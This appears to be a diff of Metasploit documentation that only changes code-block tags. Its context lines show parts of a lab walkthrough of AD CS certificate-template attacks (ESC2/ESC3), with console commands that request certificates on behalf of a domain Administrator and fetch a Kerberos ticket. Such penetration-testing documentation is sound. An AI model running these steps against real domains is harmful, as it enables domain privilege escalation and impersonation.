@@ -154,7 +154,7 @@ To run the module, specify the login credentials for an AD user, and set `RHOSTS
 This will cause the module to log into the LDAP server on the target DC, and list out the vulnerable certificate templates and which CA servers they are available from,
 as well as the permissions that are required to enroll in these certificate templates. The following is a sample output of running this against a test server:
 
-```
+```msf
 msf6 > use auxiliary/gather/ldap_esc_vulnerable_cert_finder
 msf6 auxiliary(gather/ldap_esc_vulnerable_cert_finder) > show options
 
@@ -317,7 +317,7 @@ Getting a certificate as the current user is great, but what we really want to d
 
 If we know the domain name is `daforest.com` and the domain administrator of this domain is named `Administrator` we can quickly set this up:
 
-```
+```msf
 msf6 > use auxiliary/admin/dcerpc/icpr_cert
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA daforest-WIN-BR0CCBA815B-CA
 CA => daforest-WIN-BR0CCBA815B-CA
@@ -358,7 +358,7 @@ To do this we will use the `ipcr_cert` module and we will set the usual options,
 
 For the first run, we will set the usual `RHOSTS`, `CA`, and `CERT_TEMPLATE` details, being sure to set `CERT_TEMPLATE` to the vulnerable `ESC2-Template` certificate template, and supply valid SMB login credentials. This will grant us a certificate for our current user that is based off of the vulnerable `ESC2-Template`:
 
-```
+```msf
 msf6 > use auxiliary/admin/dcerpc/icpr_cert
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
@@ -425,7 +425,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) >
 
 Next, we need to use the PFX file that we got to request another certificate to authenticate on behalf of another user. We will use the `PFX` option to specify the PFX file, and the `ON_BEHALF_OF` setting to specify the user we would like to authenticate on behalf of. Finally we will change the certificate template to another certificate template that we are able to enroll in. The default `User` certificate should work here since it allows enrollment by any authenticated domain user.
 
-```
+```msf
 msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
 
 Module options (auxiliary/admin/dcerpc/icpr_cert):
@@ -540,7 +540,7 @@ Narrowing this list down to those we can actually enroll in as users, this leave
 
 We'll first get the cert using `ipcr_cert` with the `ESC3-Template1` certificate.
 
-```
+```msf
 msf6 > use auxiliary/admin/dcerpc/icpr_cert
 msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
 
@@ -608,7 +608,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) >
 
 Next we'll try use this certificate to request another certificate on behalf of a different user. For this stage we need to specify another certificate that is vulnerable to the ESC3_TEMPLATE_2 attack vector that we are able to enroll in. We will use the `User` template for this:
 
-```
+```msf
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
 PFX => /home/gwillcox/.msf4/loot/20221216174221_default_unknown_windows.ad.cs_027866.pfx
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF DAFOREST\\Administrator
@@ -662,7 +662,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) >
 
 Just to show this is also possible with `ESC3-Template2` here is a snippet showing that also works:
 
-```
+```msf
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC3-Template2
 CERT_TEMPLATE => ESC3-Template2
 msf6 auxiliary(admin/dcerpc/icpr_cert) > show options
@@ -723,7 +723,7 @@ Certificates from Metasploit do not require a password, but if the certificate w
 one, it can be specified in the `CERT_PASSWORD` option. Set the `RHOST` datastore option to the Domain Controller, then
 run the `GET_TGT` action.
 
-```
+```msf
 msf6 > use kerberos/get_ticket
 
 Matching Modules
